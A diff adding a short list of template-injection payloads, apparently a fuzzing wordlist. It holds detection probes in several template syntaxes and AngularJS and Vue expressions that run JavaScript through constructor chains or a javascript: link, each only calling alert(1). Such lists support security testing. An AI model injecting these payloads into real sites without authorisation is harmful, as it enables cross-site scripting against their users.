@@ -1,0 +1,15 @@
+{{7*7}}
+{{7*'7'}}
+{{constructor.constructor('alert(1)')()}}
+{{$eval.constructor('alert(1)')()}}
+{{['constructor']['constructor']('alert(1)')()}}
+<div ng-app>{{7*7}}</div>
+<div ng-controller=x ng-init='$eval("7*7")'></div>
+{{_c.constructor('alert(1)')()}}
+v-bind:href=javascript:alert(1)
+{{a}}
+{{7*7}}
+{7*7}
+${7*7}
+#{7*7}
+[[7*7]]
